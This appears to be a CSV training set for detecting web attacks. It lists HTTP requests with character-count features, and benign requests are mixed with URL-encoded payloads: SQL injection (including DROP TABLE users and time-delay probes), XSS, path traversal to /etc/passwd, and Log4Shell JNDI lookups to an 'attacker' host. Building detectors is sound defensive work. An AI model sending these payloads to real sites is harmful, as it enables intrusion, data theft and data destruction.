method,path,body,single_q,double_q,dashes,braces,spaces,badwords
POST,/notifications?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/languages,,0,0,0,0,0,0
GET,/events/past?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/news/business,product=123&type=info,0,0,0,0,0,0
POST,/movies?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/organization?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/search?page=1?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/account?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/,,0,0,0,0,0,0
POST,/search?page=1?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/products/new,,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/index.html?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/sports/football,,0,0,0,0,0,0
POST,/forum/category/coding?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/blog,,0,0,0,0,0,0
POST,/api/v3/dashboard,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/travel/hotels,product=123&type=info,0,0,0,0,0,0
GET,/orders,,0,0,0,0,0,0
POST,/playlists,product=123&type=info,0,0,0,0,0,0
GET,/products/filter?price=low,,0,0,0,0,0,0
GET,/books,,0,0,0,0,0,0
GET,/blog?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
GET,/inbox/read?id=7,,0,0,0,0,0,0
GET,/events?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/auth/logout,,0,0,0,0,0,0
POST,/orders/detail?id=100,comment=Nice+product,0,0,0,0,1,0
GET,/forum/category/coding,,0,0,0,0,0,0
POST,/travel/flights?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/analytics,,0,0,0,0,0,0
POST,/weather/today?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/support,,0,0,0,0,0,0
GET,/downloads,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/admin/reports?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/billing/history,,0,0,0,0,0,0
GET,/privacy-policy?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/api/v1/users/2,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/university/courses,,0,0,0,0,0,0
GET,/api/v1/products?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/blog/post3,,0,0,0,0,0,0
POST,/auth/login,id=55,0,0,0,0,0,0
POST,/static/theme.css,uname=test&pass=test,0,0,0,0,0,0
GET,/tickets/open?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/user/profile?id=3,,0,0,0,0,0,0
POST,/assets/js/config.js,uname=test&pass=test,0,0,0,0,0,0
POST,/user/profile?id=3,uemail=test@example.com,0,0,0,0,0,0
POST,/services.php,comment=Nice+product,0,0,0,0,1,0
GET,/sports/football,,0,0,0,0,0,0
POST,/forum/post?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/orders,id=55,0,0,0,0,0,0
GET,/languages/hindi,,0,0,0,0,0,0
POST,/docs/examples,product=123&type=info,0,0,0,0,0,0
GET,/appointments,,0,0,0,0,0,0
GET,/api/v1/users/1,,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
GET,/assets/css/main.css,,0,0,0,0,0,0
POST,/shop/categories?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/user/cart,,0,0,0,0,0,0
POST,/movies/popular,comment=Nice+product,0,0,0,0,1,0
POST,/forum/post?id=3,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/products/trending,comment=Nice+product,0,0,0,0,1,0
POST,/category/fashion,uemail=test@example.com,0,0,0,0,0,0
POST,/auth/login,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/index.html,comment=Nice+product,0,0,0,0,1,0
POST,/gallery,id=55,0,0,0,0,0,0
POST,/events,comment=Nice+product,0,0,0,0,1,0
POST,/tickets/open,uemail=test@example.com,0,0,0,0,0,0
POST,/locations/india?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/products/view?id=1,,0,0,0,0,0,0
POST,/news,comment=Nice+product,0,0,0,0,1,0
POST,/auth/logout?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
POST,/organization,id=55,0,0,0,0,0,0
POST,/products/reviews?id=10,id=55,0,0,0,0,0,0
POST,/promo/summer?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/tickets/open,,0,0,0,0,0,0
POST,/crypto/market,comment=Nice+product,0,0,0,0,1,0
GET,/privacy-policy,,0,0,0,0,0,0
POST,/privacy-policy,product=123&type=info,0,0,0,0,0,0
POST,/store/cameras,uemail=test@example.com,0,0,0,0,0,0
POST,/docs/setup,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
POST,/university/courses,uemail=test@example.com,0,0,0,0,0,0
POST,/organization/about,,0,0,0,0,0,0
GET,/checkout?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/playlists?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/api/v1/categories,uname=test&pass=test,0,0,0,0,0,0
GET,/products/view?id=2,,0,0,0,0,0,0
POST,/search?q=laptops,uname=test&pass=test,0,0,0,0,0,0
GET,/downloads/app?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/auth/login?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/languages/hindi?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/playlists,uemail=test@example.com,0,0,0,0,0,0
POST,/billing/payment-methods,,0,0,0,0,0,0
POST,/music,comment=Nice+product,0,0,0,0,1,0
POST,/forum/threads,comment=Nice+product,0,0,0,0,1,0
POST,/api/v1/categories?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/locations/usa?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/page/1,,0,0,0,0,0,0
GET,/api/v3/dashboard,,0,0,0,0,0,0
GET,/reviews/post?id=29,,0,0,0,0,0,0
POST,/docs/examples?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/orders/list?q=admin%27+--,,1,0,1,0,1,0
POST,/user/profile?id=3,,0,0,0,0,0,0
GET,/gallery/videos,,0,0,0,0,0,0
GET,/settings?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/downloads/pdf?id=1,,0,0,0,0,0,0
POST,/news,uemail=test@example.com,0,0,0,0,0,0
GET,/news/business,,0,0,0,0,0,0
GET,/admin/reports,,0,0,0,0,0,0
GET,/languages/english,,0,0,0,0,0,0
GET,/feedback/submit,,0,0,0,0,0,0
GET,/products/related?id=10,,0,0,0,0,0,0
GET,/university/courses,,0,0,0,0,0,0
POST,/organization,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/gallery,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/promo/summer,uemail=test@example.com,0,0,0,0,0,0
GET,/crypto?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/blog/post1,,0,0,0,0,0,0
POST,/forum/post?id=2,comment=Nice+product,0,0,0,0,1,0
GET,/sports,,0,0,0,0,0,0
POST,/auth/login?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/account/security,,0,0,0,0,0,0
POST,/user/messages,uname=test&pass=test,0,0,0,0,0,0
GET,/store/checkout,,0,0,0,0,0,0
POST,/locations/usa?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/support/ticket?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/admin/settings,product=123&type=info,0,0,0,0,0,0
POST,/shop,comment=Nice+product,0,0,0,0,1,0
GET,/careers?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/partners?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/admin/users,id=55,0,0,0,0,0,0
GET,/travel/flights,,0,0,0,0,0,0
GET,/library,,0,0,0,0,0,0
GET,/careers,,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
POST,/university,comment=Nice+product,0,0,0,0,1,0
POST,/dashboard/overview?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/events?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/search?page=2?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/events/past?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/account/history,comment=Nice+product,0,0,0,0,1,0
POST,/blog/post2,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/docs/introduction?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/subscribe,,0,0,0,0,0,0
POST,/promo/winter,id=55,0,0,0,0,0,0
POST,/news/business,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v2/login?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/store/apply-coupon?code=NEW50,product=123&type=info,0,0,0,0,0,0
POST,/projects/list?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/crypto/market,uemail=test@example.com,0,0,0,0,0,0
GET,/settings/profile,,0,0,0,0,0,0
POST,/admin/logs,uemail=test@example.com,0,0,0,0,0,0
POST,/appointments/book,product=123&type=info,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
POST,/checkout/address,product=123&type=info,0,0,0,0,0,0
GET,/api/v2/register,,0,0,0,0,0,0
GET,/user/profile?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/settings/preferences?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/gallery/videos?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/docs/tutorials,,0,0,0,0,0,0
GET,/locations/india?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/newsfeed/today?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/api/v2/register,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v3/settings?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/api/v2/auth,,0,0,0,0,0,0
POST,/products,,0,0,0,0,0,0
GET,/settings/security?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/shop,,0,0,0,0,0,0
POST,/auth/login,uname=test&pass=test,0,0,0,0,0,0
GET,/api/v3/messages?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/search?q=mobiles,,0,0,0,0,0,0
POST,/static/script.js,id=55,0,0,0,0,0,1
POST,/services.html,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/billing,,0,0,0,0,0,0
GET,/news/local,,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
POST,/api/v1/users?page=2?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/restaurants,id=55,0,0,0,0,0,0
POST,/settings,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/auth/logout,,0,0,0,0,0,0
POST,/blog/post2,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/api/v2/checkout,,0,0,0,0,0,0
POST,/subscriptions,uaddress=21+street&update=update,0,0,0,0,1,5
POST,/search?page=1,product=123&type=info,0,0,0,0,0,0
GET,/appointments/book?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/university/course?id=20,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/api/v1/users?page=2,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v1/orders,,0,0,0,0,0,0
POST,/index.php?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/subscriptions/manage,,0,0,0,0,0,1
GET,/store/cart?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/auth/login?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/help/faq,,0,0,0,0,0,0
POST,/products/reviews?id=10,uemail=test@example.com,0,0,0,0,0,0
GET,/contact.html?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/careers/job?id=25,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/search?q=laptops,,0,0,0,0,0,0
POST,/api/v1/users/2,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/api/v2/orders,comment=Nice+product,0,0,0,0,1,0
GET,/store/apply-coupon?code=NEW50?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/organization,,0,0,0,0,0,0
POST,/projects/list?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/forum/post?id=1,product=123&type=info,0,0,0,0,0,0
POST,/appointments/book,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/products/filter?cat=women,,0,0,0,0,0,0
GET,/events/upcoming?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/api/v1/items,uname=test&pass=test,0,0,0,0,0,0
POST,/promo/summer,uname=test&pass=test,0,0,0,0,0,0
POST,/news,product=123&type=info,0,0,0,0,0,0
POST,/blog/category/tech,uname=test&pass=test,0,0,0,0,0,0
POST,/services.html,,0,0,0,0,0,0
POST,/books/bestsellers?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/products/filter?price=high,,0,0,0,0,0,0
POST,/support/chat,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/weather/today,,0,0,0,0,0,0
GET,/index.html,,0,0,0,0,0,0
POST,/library/books,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/crypto,,0,0,0,0,0,0
POST,/downloads/app?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/reviews/post?id=29,,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/dashboard/overview,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/account,id=55,0,0,0,0,0,0
GET,/services.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/assets/images/logo.png,comment=Nice+product,0,0,0,0,1,0
GET,/news/local,,0,0,0,0,0,0
GET,/user?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/organization/team,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/playlists/trending,comment=Nice+product,0,0,0,0,1,0
GET,/orders/detail?id=100,,0,0,0,0,0,0
POST,/store/cart,comment=Nice+product,0,0,0,0,1,0
POST,/partners,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/projects,,0,0,0,0,0,0
POST,/feedback/form,uemail=test@example.com,0,0,0,0,0,0
POST,/page/3?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/books,product=123&type=info,0,0,0,0,0,0
POST,/blog,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/products/new,,0,0,0,0,0,0
POST,/user/cart,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/inbox,,0,0,0,0,0,0
POST,/restaurants/nearby?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/contact.html?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/user/cart/add?id=45,,0,0,0,0,0,0
POST,/forum/threads?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/checkout/address,,0,0,0,0,0,0
GET,/api/v3/dashboard,,0,0,0,0,0,0
POST,/projects/view?id=8,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/organization,comment=Nice+product,0,0,0,0,1,0
POST,/inbox/read?id=7,comment=Nice+product,0,0,0,0,1,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
GET,/books/bestsellers,,0,0,0,0,0,0
GET,/orders/list,,0,0,0,0,0,0
GET,/account/history?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/api/v3/messages,,0,0,0,0,0,0
GET,/sports,,0,0,0,0,0,0
GET,/travel/offers,,0,0,0,0,0,0
GET,/docs/introduction,,0,0,0,0,0,0
POST,/api/v1/users,uemail=test@example.com,0,0,0,0,0,0
POST,/crypto/coin?id=ETH,product=123&type=info,0,0,0,0,0,0
POST,/search?q=mobiles,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/docs/api,,0,0,0,0,0,0
GET,/services.html?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/travel/flights?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/dashboard/stats?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/dashboard?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/user/orders,,0,0,0,0,0,0
GET,/feedback/form?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/blog/category/tech,comment=Nice+product,0,0,0,0,1,0
POST,/shop,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/blog/category/tech,,0,0,0,0,0,0
GET,/faq?q=sleep%285%29,,0,0,0,1,0,2
GET,/user/orders,,0,0,0,0,0,0
GET,/forum/category/coding?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/docs/introduction?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/user/notifications,,0,0,0,0,0,0
GET,/assets/css/main.css?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/products/filter?cat=women,,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
POST,/products/view?id=2,id=55,0,0,0,0,0,0
GET,/user,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
POST,/news/latest,uname=test&pass=test,0,0,0,0,0,0
POST,/projects/view?id=8,id=55,0,0,0,0,0,0
POST,/products,comment=Nice+product,0,0,0,0,1,0
GET,/assets/css/main.css?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/subscriptions/manage?q=%22+AND+1%3D1+--,,0,1,1,0,3,2
GET,/news/trending,,0,0,0,0,0,0
POST,/page/3,product=123&type=info,0,0,0,0,0,0
GET,/api/v3/messages?q=admin%27+--,,1,0,1,0,1,0
GET,/forum/category/coding,,0,0,0,0,0,0
GET,/faq?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/terms-and-conditions?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/user/orders,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/university,,0,0,0,0,0,0
GET,/feedback/submit,,0,0,0,0,0,0
POST,/books/bestsellers,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v1/items?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/api/v1/users?page=2,,0,0,0,0,0,0
GET,/checkout/payment,,0,0,0,0,0,0
POST,/services.php,,0,0,0,0,0,0
GET,/gallery/videos,,0,0,0,0,0,0
GET,/static/theme.css?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/books/read?id=100,,0,0,0,0,0,0
POST,/inbox,uemail=test@example.com,0,0,0,0,0,0
POST,/blog/category/lifestyle,id=55,0,0,0,0,0,0
POST,/weather/city?name=Delhi,id=55,0,0,0,0,0,0
POST,/weather/today,id=55,0,0,0,0,0,0
POST,/music,id=55,0,0,0,0,0,0
POST,/account/downloads,uname=test&pass=test,0,0,0,0,0,0
POST,/user/profile,comment=Nice+product,0,0,0,0,1,0
POST,/orders/list?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/inbox/messages,,0,0,0,0,0,0
GET,/checkout/address,,0,0,0,0,0,0
POST,/careers/job?id=25?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/search?cat=electronics,,0,0,0,0,0,0
POST,/terms-and-conditions,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/news/world,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/checkout/address,,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
GET,/services.html?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/blog/post1,,0,0,0,0,0,0
POST,/store/checkout,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/items,comment=Nice+product,0,0,0,0,1,0
POST,/unsubscribe,comment=Nice+product,0,0,0,0,1,0
GET,/services.html,,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
GET,/search?cat=electronics?q=admin%27+--,,1,0,1,0,1,0
POST,/checkout/address,comment=Nice+product,0,0,0,0,1,0
POST,/music?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/promo/winter,uname=test&pass=test,0,0,0,0,0,0
GET,/search?cat=fashion?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/stocks/market?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/assets/images/logo.png,product=123&type=info,0,0,0,0,0,0
POST,/docs/api?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/admin/settings,,0,0,0,0,0,0
POST,/api/v2/login?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/products/top,uname=test&pass=test,0,0,0,0,0,0
POST,/orders/detail?id=100?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/news/trending,,0,0,0,0,0,0
POST,/forum/category/tech,comment=Nice+product,0,0,0,0,1,0
POST,/auth/verify-email?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/downloads/app,,0,0,0,0,0,0
POST,/reviews/post?id=29,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/tickets/open,,0,0,0,0,0,0
POST,/languages/hindi,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/blog/post2,,0,0,0,0,0,0
POST,/feedback/form?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/projects/view?id=8?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/page/2?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/playlists?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/products/view?id=1,id=55,0,0,0,0,0,0
GET,/dashboard/stats,,0,0,0,0,0,0
GET,/weather/today,,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
GET,/shop,,0,0,0,0,0,0
GET,/admin/users?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/api/v2/login,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/billing/payment-methods?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/help/faq,,0,0,0,0,0,0
POST,/travel/offers,product=123&type=info,0,0,0,0,0,0
GET,/api/v1/categories,,0,0,0,0,0,0
GET,/api/v3/dashboard?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/category/home-appliances,,0,0,0,0,0,0
GET,/products/trending,,0,0,0,0,0,0
POST,/books/read?id=100,,0,0,0,0,0,0
GET,/partners,,0,0,0,0,0,0
POST,/settings/billing,comment=Nice+product,0,0,0,0,1,0
POST,/contact.php,uname=test&pass=test,0,0,0,0,0,0
GET,/forum/post?id=3,,0,0,0,0,0,0
GET,/user/cart,,0,0,0,0,0,0
GET,/terms-and-conditions,,0,0,0,0,0,0
POST,/terms-and-conditions?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/search?page=2,,0,0,0,0,0,0
POST,/help/contact,product=123&type=info,0,0,0,0,0,0
POST,/auth/register,id=55,0,0,0,0,0,0
POST,/books/bestsellers,id=55,0,0,0,0,0,0
GET,/terms-and-conditions?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/admin/settings,uemail=test@example.com,0,0,0,0,0,0
POST,/subscriptions,uaddress=21+street&update=update,0,0,0,0,1,5
POST,/auth/register?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
